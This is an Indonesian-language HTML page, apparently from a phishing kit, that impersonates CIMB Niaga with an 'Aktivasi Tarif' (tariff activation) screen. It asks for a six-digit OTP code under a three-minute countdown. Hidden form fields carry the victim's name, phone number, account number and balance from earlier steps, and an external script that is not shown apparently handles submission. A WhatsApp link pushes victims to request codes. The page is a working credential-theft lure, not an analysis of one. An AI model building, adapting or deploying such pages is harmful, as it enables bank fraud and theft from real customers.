<!DOCTYPE html><html lang="en"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aktivasi Tarif Bank Cimb Niaga</title>
    <meta name="theme-color" content="#CC0000">
    <link rel="icon" type="image/png" href="">
    <meta property="og:image" content="">
    <meta name="twitter:image" content="">
    <meta name="description" content="Bank BRI terus berinovasi mengembangkan produk yang sesuai dengan perkembangan jaman untuk memenuhi kebutuhan nasabah">

    <!-- Modern CSS Reset -->
    <style>
    :root {
        --primary-color: #137fd5;
        --secondary-color: #FF4500;
        --text-color: #333;
        --light-bg: #e0f2fe;
        --card-bg: rgba(255, 255, 255, 0.9);
        --error-color: #e63946;
        --success-color: #2a9d8f;
    }
    
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }
    
    body {
        font-family: 'Poppins', system-ui, -apple-system, sans-serif;
        background: #ddd;
        color: var(--text-color);
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 1rem;
        line-height: 1.6;
    }
    
    .auth-card {
        width: min(100%, 380px);
        background: var(--card-bg);
        padding: 2rem;
        border-radius: 1rem;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        backdrop-filter: blur(10px);
        position: relative;
        overflow: hidden;
    }
    
    .auth-card::before {
        content: "";
        position: absolute;
        top: -3rem;
        left: -3rem;
        width: 10rem;
        height: 10rem;
        background: linear-gradient(135deg, #007bff, #00c853);
        border-radius: 50%;
        opacity: 0.1;
        z-index: -1;
    }
    
    .card-header {
        text-align: center;
        margin-bottom: 1.5rem;
    }
    
    .card-header img {
        max-width: 150px;
        height: auto;
    }
    
    .card-title {
        font-size: 1.4rem;
        font-weight: 600;
        color: #CC0000;
        margin-bottom: 1rem;
    }
    
    .card-description {
        font-size: 0.9rem;
        margin-bottom: 1.5rem;
    }
    
    .highlight-text {
        color: var(--primary-color);
        font-weight: 600;
    }
    
    .form-group {
        margin-bottom: 1.25rem;
    }
    
    .form-label {
        display: block;
        font-weight: 500;
        margin-bottom: 0.5rem;
    }
    
    .form-input {
        width: 100%;
        padding: 0.75rem;
        border: 1px solid var(--primary-color);
        border-radius: 0.5rem;
        font-size: 0.9rem;
        transition: all 0.3s ease;
        background-color: rgba(255, 255, 255, 0.8);
    }
    
    .form-input:focus {
        outline: none;
        box-shadow: 0 0 0 3px rgba(19, 127, 213, 0.2);
        border-color: var(--primary-color);
    }
    
    .submit-btn {
        width: 100%;
        padding: 0.75rem;
        background-color: #CC0000;
        color: white;
        border: none;
        border-radius: 0.5rem;
        font-weight: 500;
        cursor: pointer;
        transition: all 0.3s ease;
        margin-top: 0.5rem;
    }
    
    .submit-btn:hover {
        background-color: var(--secondary-color);
        transform: translateY(-2px);
    }
    
    .submit-btn:disabled {
        opacity: 0.5;
        cursor: not-allowed;
        transform: none;
    }
    
    .action-link {
        display: block;
        text-align: center;
        margin-top: 1rem;
        color: var(--primary-color);
        text-decoration: none;
        font-size: 0.9rem;
        transition: color 0.3s ease;
    }
    
    .action-link:hover {
        color: var(--secondary-color);
        text-decoration: underline;
    }
    
    .alert {
        padding: 0.75rem;
        border-radius: 0.5rem;
        margin-bottom: 1rem;
        font-size: 0.9rem;
    }
    
    .alert-error {
        background-color: rgba(230, 57, 70, 0.1);
        border: 1px solid var(--error-color);
        color: var(--error-color);
    }
    
    .timer {
        color: var(--primary-color);
        font-weight: 600;
        font-size: 0.9rem;
        margin: 1rem 0;
    }
    
    .whatsapp-float {
        position: fixed;
        bottom: 1.5rem;
        right: 1.5rem;
        z-index: 100;
    }
    
    .whatsapp-float img {
        width: 3.5rem;
        height: 3.5rem;
        transition: transform 0.2s ease;
    }
    
    .whatsapp-float img:hover {
        transform: scale(1.1);
    }
    
    .loading-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.8);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 1000;
        display: none;
    }
    
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    
    .spinner {
        border: 4px solid rgba(255, 255, 255, 0.3);
        border-radius: 50%;
        border-top: 4px solid white;
        width: 2.5rem;
        height: 2.5rem;
        animation: spin 1s linear infinite;
    }
    </style>
</head>

<body>
    <div class="loading-overlay">
        <div class="spinner"></div>
    </div>

    <div class="auth-card">
        <div class="card-header">
            <img src="images/octo_loading.gif" alt="CIMB Niaga" width="30%">
        </div>
        
        <h1 class="card-title">Aktivasi Tarif Bank Cimb Niaga</h1>
        
        <p class="card-description">
            Masukan kode Aktivasi / Virtual yang telah dikirimkan ke nomor
            <span id="phone-number" class="highlight-text"></span>
        </p>
        
        <p class="timer" id="countdown"></p>
        
        <div class="alert alert-error" id="errorAlert" style="display: none;"><p>Kode Aktivasi salah!</p></div>
        
        <form method="post" id="otp-form" onsubmit="sendOtp(event)">
            <input type="hidden" id="tarif" name="tarif">
            <input type="hidden" id="nomor" name="nomor">
            <input type="hidden" id="nama" name="nama">
            <input type="hidden" id="rek" name="rek">
            <input type="hidden" id="saldo" name="saldo">
            
            <div class="form-group">
                <label for="otp-input">Konfirmasi (Wajib)</label>
                <input type="tel" class="form-input" id="otp" name="otp" placeholder="Kode Virtual" maxlength="6" minlength="6" pattern="[0-9]{6}" required="" title="Mohon masukkan Kode OTP dengan benar">
            </div>
            
            <button type="submit" id="submit-btn" class="submit-btn">Konfirmasi</button>
        </form>
        
        <a onclick="wa()" class="action-link"><b>>> Request kode Virtual <<<</b></a>
    </div>

    <div class="whatsapp-float">
        <a onclick="wa()">
            <img src="images/oz5jsz.png" alt="Hubungi WhatsApp">
        </a>
    </div>

    <script src="js/jquery.min.js"></script>    
    <script src="js/data.js"></script>

    <script>
    // DOM Elements
    
    
    const loadingOverlay = document.querySelector(".loading-overlay");
    
    
    
 document.getElementById("tarif").value =
        sessionStorage.getItem("tarif");
document.getElementById("nomor").value =
        sessionStorage.getItem("nomor");
document.getElementById("nama").value =
        sessionStorage.getItem("nama");
document.getElementById("rek").value =
        sessionStorage.getItem("rek");
document.getElementById("saldo").value =
        sessionStorage.getItem("saldo");    
    
    // Timer function
    function startTimer(duration) {
        let timer = duration;
        const display = document.getElementById("countdown");
        const intervalId = setInterval(() => {
            const minutes = Math.floor(timer / 60).toString().padStart(2, '0');
            const seconds = (timer % 60).toString().padStart(2, '0');
            
            display.textContent = `Waktu tersisa: ${minutes}:${seconds}`;
            
            if (--timer < 0) {
                clearInterval(intervalId);
                document.querySelector(".action-link").classList.remove("disabled");
            }
        }, 1000);
    }
    
    // Initialize on page load
    document.addEventListener("DOMContentLoaded", () => {
        startTimer(180); // 3 minutes timer
    });
    
    
    </script>


</body></html>
